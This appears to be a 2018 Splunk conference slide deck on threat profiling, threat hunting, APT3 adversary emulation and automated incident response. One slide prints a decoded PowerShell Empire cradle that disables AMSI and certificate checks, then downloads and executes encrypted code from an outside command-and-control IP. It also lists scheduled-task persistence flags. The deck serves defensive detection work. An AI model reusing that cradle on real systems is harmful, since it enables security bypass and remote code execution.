From Threat Modeling to Automated Response
Identifying the Adversary and Dynamically Moving to Incident Response
Michael Kunz, Sandia National Labs John Stoner, Splunk
October 2018 | Version 1.0

© 2018 SPLUNK INC.

Forward-Looking Statements

© 2018 SPLUNK INC.

During the course of this presentation, we may make forward-looking statements regarding future events or the expected performance of the company. We caution you that such statements reflect our current expectations and estimates based on factors currently known to us and that actual events or results could differ materially. For important factors that may cause actual results to differ from those contained in our forward-looking statements, please review our filings with the SEC.
The forward-looking statements made in this presentation are being made as of the time and date of its live presentation. If reviewed after its live presentation, this presentation may not contain current or accurate information. We do not assume any obligation to update any forward-looking statements we may make. In addition, any information about our roadmap outlines our general product direction and is subject to change at any time without notice. It is for informational purposes only and shall not be incorporated into any contract or other commitment. Splunk undertakes no obligation either to develop the features or functionality described or to include any such feature or functionality in a future release.
Splunk, Splunk>, Listen to Your Data, The Engine for Machine Data, Splunk Cloud, Splunk Light and SPL are trademarks and registered trademarks of Splunk Inc. in the United States and other countries. All other brand names, product names, or trademarks belong to their respective owners. © 2018 Splunk Inc. All rights reserved.

# whoami > John Stoner

© 2018 SPLUNK INC.

GCIA, GCIH, GCTI

 20+ years kicking around databases, ISPs and cyber

 3.5 years at Splunk

 Creator of SA-Investigator

 Co-editor and author Hunting with Splunk: The Basic blog series

 Assist in steering the BOTS ship

 Enjoys writing workshops on

Principal Security Strategist @stonerpsu

hunting and investigating with Splunk

 Listening to The Smiths

# whoami > Michael Kunz

© 2018 SPLUNK INC.

Sr. Cyber Security SME,
Cyber Analysis Research and Development Solutions

 Sandia National Labs  Pentester  OSCP, OSCE, OSWP  Large Scale Virtualization
· Minimega  Amateur Drone Pilot

Agenda
 Threat Profiling  Threat Hunting & Incident Response  Building Threat Intelligence  Models for Adversary Emulation  Adversary Emulation  Examples  Automation

© 2018 SPLUNK INC.

© 2018 SPLUNK INC.
Threat Profiling

© 2018 SPLUNK INC.
Defenders need to think like the Attackers

Threat Profiling
 Who is your adversary? · Nation State · Hacktivists · Employees (internal staff) · Partners · Crimeware · Other

© 2018 SPLUNK INC.

Example of an Advanced Threat

© 2018 SPLUNK INC.

Threat Intelligence

TraDnesliavecrtyion

Gain Access Exploitation & IntostSalylastieomn

Attacker hacks website. Steals .pdf files

Web Portal

Create Additional CommEnavnidro&nmCeonnttrol

Conduct AccompBliusshinMeission
Remote control, Steal data, Persist in company, Rent as botnet

Network Activity/Security
Host Activity/Security

Attacker creates malware,
embed in .pdf
Emails to the target

EMAIL

Read email, open attachment

Auth - User Roles

HTTP (web) session to command & control server
.pdf executes & unpacks malware overwriting and running "allowed" programs

WEB

Calc.exe

Svchost.exe

Get to know your threat
 Threat Reports  Conferences  Twitter  Blogs  Malware Activity  Information Sharing  CVE's  Incident Response and Forensics

© 2018 SPLUNK INC.

© 2018 SPLUNK INC.
Threat Hunting and Incident Response

Why Do We Hunt?

© 2018 SPLUNK INC.

Targeting
 What are you trying to protect?  What are common targets for your
adversary? · Executives? · Web Servers? · Database Servers? · Users?
 How do we reinforce our defenses against people attacking those targets?
 Thinking Like The Your Adversary

© 2018 SPLUNK INC.

© 2018 SPLUNK INC.

© 2018 SPLUNK INC.
"Threat hunters focus their search
on adversaries...and who are already within the networks and systems of the threat hunters'
organization"
SANS - The Who, What, Where, When, Why and How of Effective Threat Hunting

Threat Hunting and Incident Response

© 2018 SPLUNK INC.

Threat Hunting

Incident Response

Incident Response

 Classic activity that is performed when something "bad" happens
 Think about it from an investigation perspective · Who, what, where, when, why, how?
 Security Operations deals with this all day long  Focus on containment and recovery
 Work with other teams to eradicate
 Forensics and Reverse Engineering may come into play

NIST SP800-61

© 2018 SPLUNK INC.

What Are We Trying To Accomplish?

© 2018 SPLUNK INC.

Threat Intelligence
Network Activity/Security
Host Activity/Security
Auth - User Roles

TraDnesliavecrtyion

Exploitation & InGtsotaaSilnlyasAttioeccnmess
Web Portal

CommCEanrenvaidrtoe&nAmCdoednnitttiroonl al

AccompCBlisuohsnidMnueiscsstsion

X

Events that contain link to file

EMAIL

Deny/Disrupt

X

Proxy log C2 communication
to blacklist

WEB

X

What created the program/process?

X

Calc.exe

How was process started?

X

Svchost.exe

Process making C2 traffic

Where Do I Start?
 Collect all your indicators · Take an indicator and pull on the string
 Activities considered to be out of the norm · Data Volumes, Directionality, Destinations, Sources, Apps, Time
 Why are adversary teams going after your targets? · Is it the lowest hanging fruit? · Path of least resistance? · High value?
 Past performance is not always indicative of future results, but previous security events and incidents may identify trends · Did the attackers leave anything to identify them by? · Hashes, Domains, Techniques, SSL Certs · How did they get in before? · Phishing, Zero Day, Insider

© 2018 SPLUNK INC.

© 2018 SPLUNK INC.
""To people outside the security team,
hunting looks like lucky guessing, but it's far from that. Hunting is based on a combination of instinct, experience,
and good intelligence."
Intelligence-Driven Incident Response: Outwitting the Adversary Scott J. Roberts andRebekah Brown

© 2018 SPLUNK INC.
Building Threat Intelligence

Past and Present Hunts

© 2018 SPLUNK INC.

Threat Intelligence

TraDneslivaecrytion

Exploitation & InGstaailnlaAtiocncess to System

Attacker hacks website. Steals .pdf files

Web Portal

CommCarnedat&e ACdodnittrioolnal Environment

AccomplCisohnMduiscstion Business
Remote control, Steal data, Persist in company, Rent as botnet

Network Activity/Security
Host Activity/Security
Auth - User Roles

Attacker
creates malware,
embed in .pdf
Search historically ­

Ebmaailsck in time
to the target

EMAIL

Related evidence from other
security devices
Read email, open attachment

Look for new indicators

HTTP (web) session to

command & control server

WEB

.pdf executes & unpacks malware overwriting and running "allowed" programs

Calc.exe

Svchost.exe

Threat Intelligence

Insights from Events Collected

© 2018 SPLUNK INC.

TraDneslivaecrytion

Exploitation & InsGtotaaSlilnaytsAiotecncmess

Attacker hacks website. Steals .pdf files

Web Portal

CommCEanrnevdairto&enCAmdoednnitttrioolnal Blacklisted IP

AccomplCBisuohsnMidnuiescsstsion
Remote control, Steal data, Persist in company, Rent as botnet

Network Activity/Security
Host Activity/Security
Auth - User Roles

Attacker creates malware,
embed in .pdf
Emails to the target

EMAIL

Email with Attachment

Communication Paths

Read email, open attachment

HTTP (web) session to command & control server

WEB

.pdf executes & unpacks malware overwriting and running "allowed" programs

Process execution and installation

Windows Authentication

Admin account used

Calc.exe

Svchost.exe

Intel Gathering

© 2018 SPLUNK INC.

 Open Source Intel · Threat Reports, Conferences, Twitter, Blogs, Malware Activity, Information Sharing,
CVE's
 Subscriptions · Do you have any threat feed partnerships? · Is it worth purchasing feeds?
 Tools · EDR Solutions

© 2018 SPLUNK INC.
Models for Adversary Emulation

Lockheed Martin Kill Chain
 If one artifact (IP, host, process, etc) can be identified, a defender can move in either direction along the kill chain to disrupt a current operation or learn more to prevent future attacks

© 2018 SPLUNK INC.

MITRE ATT&CK

© 2018 SPLUNK INC.

 Adversarial Tactics, Techniques, and Common Knowledge
 Builds on Lockheed Martin's Kill Chain but focuses on tactics and techniques that occur during exploit and activity occurring post exploit

Diamond Model
 More often used within Threat Intelligence, but has a place as part of Threat Hunting
 Used for contextualizing threat intelligence that is found during hunting
 Sergio Caltagirone, Andrew Pendergast, Christopher Betz · http://www.dtic.mil/dtic/tr/fulltext/u2/a586960.
pdf
· https://threatconnect.com/blog/diamond-
model-threat-intelligence-star-wars/

© 2018 SPLUNK INC.

Data Sources Needed

© 2018 SPLUNK INC.

Threat Intelligence
Network Activity/Security
Host Activity/Security
Auth - User Roles

TraDnelsivaecrytion

Exploitation &GaIninstAalclacteiosns to System

ComCmreaantde&AdCdointiotrnoal l Environment

AccomCpolinshduMcitssion Business

Attacker hacks website. Steals .pdf files

Web Portal
· Third-party Threat Intel · Open source blacklist · Internal threat intelligence

Remote control, Steal data, Persist in company, Rent as botnet

Attacker creates malware,
embed in .pdf
Emails to the target

· Firewall · IDS / IPS · Vulnerability scanners

· Web Proxy · NetFlow · Network

EMAIL

· Endpoint (AV/IPS/FW) · Malware detection Read· ePmCaiLl, Mopen attachment

· DHCP · OS logs · Patching

HTTP (web) session to command & control server

· Active Directory · LDAP · CMDB

.pdf executes & unpacks malware
· oOveprwerriatintignagnSd yrusntenimng "allowed" programs · Database · VPN, AAA, SSO

WEB

Calc.exe

Svchost.exe

© 2018 SPLUNK INC.
Adversary Emulation

Current State of Detection

© 2018 SPLUNK INC.

 Tools  Information Sharing  Threat Feeds  Indicators of Compromise
· File Names · Hashes · Registry Keys · Domains · IP Addresses

 Problems · Expensive · Slow · False Positives · Not everyone shares · Quality of the intel · Time sensitive · Reactive instead of Proactive · Breaks IA Principles · Safety is only guaranteed by confidentiality · Tools can make you more vulnerable

Difficult Questions
 Is <insert VENDOR>'s product working?  How can it (detect|prevent) better?  How can we be more (efficient|effective) with <vendor>'s
product?  How can I make my all of my products work together?

© 2018 SPLUNK INC.

© 2018 SPLUNK INC.

1. We need better data
 Let's leverage emulation to enhance detection  By building a variety of attacks and attack environments we can
· Fine tune tools · Evaluate our tools · Develop new IOC's · Detect technique usage · Streamline and test response

© 2018 SPLUNK INC.

Adversary Emulation
 Splunk BOTS ­ Imaginary Adversary · Leverages TTPs of real adversaries
 Open Source - Red Team Automation · Red Canary Atomic Red Team · MITRE Caldera · Endgame Red Team Automation · Uber Meta · Infection Monkey · Roll your own
 Red Team Automation · Safe Breach · Firedrill · Verodin · Pentesters

© 2018 SPLUNK INC.

Adversary Emulation
 Train the tools  Test the tools  Profile the adversary  Enrich data  Extrapolate data to fill in
missing gaps

© 2018 SPLUNK INC.

https://attack.mitre.org/w/img_auth.php/6/6c/APT3_Adversary_Emulation_Plan.pdf

Techniques Example
APT 3

© 2018 SPLUNK INC.

https://attack.mitre.org/wiki/Group/G0022

Adversary Simulation
Navigate to Web Server With Bad Ad

© 2018 SPLUNK INC.

Adversary Simulation
Starting Meterpreter

© 2018 SPLUNK INC.

Adversary Simulation
Migrating to Empire

© 2018 SPLUNK INC.

Adversary Simulation
Registry Persistence
Scheduled Tasks Persistence
WMI Persistence

Establish Persistence

© 2018 SPLUNK INC.

2. We make our systems smarter

 Minimally · Evaluate · Detect · Contain · Eradicate

 Ideally · Active Defenses · Deception · Forensic Collection · IOC development · Information Sharing · Closing the hole
elsewhere

© 2018 SPLUNK INC.

Example: Scheduled Task Persistance
What is the Task Scheduler in Windows?

© 2018 SPLUNK INC.

Your Run of the Mill Scheduled Task

© 2018 SPLUNK INC.

Change an existing task

Name of the task

Enable the task

What Are The Events Telling Us?

© 2018 SPLUNK INC.

 /Create ­ creates a new task
 /F - forcefully creates the task and suppresses warnings if the task exists
 /RU - Specifies the user context under which the task runs - system

 /SC ­ Frequency of schedule ­ Daily
 /ST ­ Time the task starts ­ 10:51
 /TN ­ Name of the task ­ Updater
 /TR ­ Path and filename of the executable to run

How Can We Find This?

© 2018 SPLUNK INC.

What Else Could I Look For?

© 2018 SPLUNK INC.

What Do We Find?
Decoding to Find PowerShell Empire Cradle

© 2018 SPLUNK INC.

[REF].ASSeMBlY.GEtTypE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GeTFIeLD('amsiInitFa iled','NonPublic,Static').SETVAlUe($nUll,$tRue)};[System.NET.SeRviCEPoIntMANAGEr]::EXPect100ConTi Nue=0;$Wc=New-ObJECT SYSTeM.NET.WeBClIent;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$Wc.HeADeRS.ADd('UserAgent',$u);$wc.PRoxY=[SYStem.NET.WEBRequESt]::DEFaUlTWeBPrOxY;$Wc.PrOXy.CRedEntialS = [SYsTEM.NET.CRedeNtiALCachE]::DeFAuLTNEtWorkCreDeNtials;$K=[SYsTem.TeXT.EncODIng]::ASCII.G ETBytes('389288edd78e8ea2f54946d3209b16b8');$R={$D,$K=$ArGS;$S=0..255;0..255|%{$J=($J+$S[$_] +$K[$_%$K.COunt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I], $S[$H]=$S[$H],$S[$I];$_bxOR$S[($S[$I]+$S[$H])%256]}};$wc.HeaDERs.AdD("Cookie","session=wInU2UbWvd/SdOjjVta0BHaZHjI= ");$ser='https://45.77.65.211:443';$t='/login/process.php';$DaTA=$WC.DowNloAdDATA($sEr+$T);$iv=$DaT A[0..3];$dAta=$data[4..$datA.lenGTH];-jOiN[ChAr[]](& $R $dATA ($IV+$K))|IEX

© 2018 SPLUNK INC.
Pulling it all Together

How can we get there?

© 2018 SPLUNK INC.

 Export your data from your tools to Splunk  Scoring Events  Encourage Vendors to create APIs Phantom can access  Create Phantom Playbooks to extend vendor functionality and interoperability

Automated Response

© 2018 SPLUNK INC.

Sample Play
 Triage an Attack · Carbon Black - Collect process information · Virus Total - Lookup domains and ip addresses for open network connections · Carbon Black ­ Isolate a box · Palo Alto ­ Add a Domain to the block list · Carbon Black ­ Fetch a binary from host · Carbon Black ­ Hunt for binary elsewhere on network · Carbon Black ­ Ban binary hash to prevent execution · Falcon ­ Detonate Binary online · Email gathered data to IR Team

© 2018 SPLUNK INC.

Apply Process To Findings

© 2018 SPLUNK INC.

Testing, Refining, and Operationalizing

© 2018 SPLUNK INC.

 IR Team can now better use their time  Customers learn to better use vendor tools  IOCs can be improved  False positives can be tuned

Automate/Orchestrate Playbook for Threat

Identify Your Adversary

Profile (Research)

Iterate Findings into Security Operations
(Process)

Emulate Your Adversary (Attack)

Document Findings

© 2018 SPLUNK INC.
"End goal of hunting should be a change in policy or procedure operationalization, don't do the same thing over and over again"
Threat Hunting Webshells with Splunk, James Bower

Summary
 Think more like the adversary  Train your tools to detect actions in addition to
looking for IOCs  Encourage information sharing  Many opportunities to disrupt or deny  Don't worry if you don't strike gold every time
· Make your team better with every hunt  Automate and Orchestrate
· Contextualize, contextualize, contextualize

© 2018 SPLUNK INC.

Additional Reading

© 2018 SPLUNK INC.

 Enablers for APT3 Emulation · https://attack.mitre.org/wiki/Group/G0022 · https://www.fireeye.com/blog/threat-research/2015/06/operation-clandestine-wolf-adobe-flash-zero-day.html · https://www.theverge.com/2015/7/8/8911077/adobe-flash-hacking-team-vulnerability · https://www.sisainfosec.com/blogs/adobe-flash-zero-day-vulnerability-operation-clandestine-wolf-by-fireeye/ · https://www2.fireeye.com/Webinar-FAAS-Clandestine-Wolf_LP.html
 Splunk's Hunting Blog Series · https://www.splunk.com/blog/2017/07/06/hunting-with-splunk-the-basics.html
 BOTS Dataset and App for Investigations · Security Dataset Project - If you are interested in hunting further, register and hunt in your own sandbox · http://live.splunk.com/splunk-security-dataset-project · If you would like to take the data set home with you and explore further, now you can! · http://explore.splunk.com/BOTS_1_0_datasets · If you load BOTS v1 data into your instance, the Boss of the SOC Investigation Workshop for Splunk app can be
installed
· This app is already embedded in the dataset project · https://splunkbase.splunk.com/app/3985/

© 2018 SPLUNK INC.
Don't forget to rate this session in the .conf18 mobile app

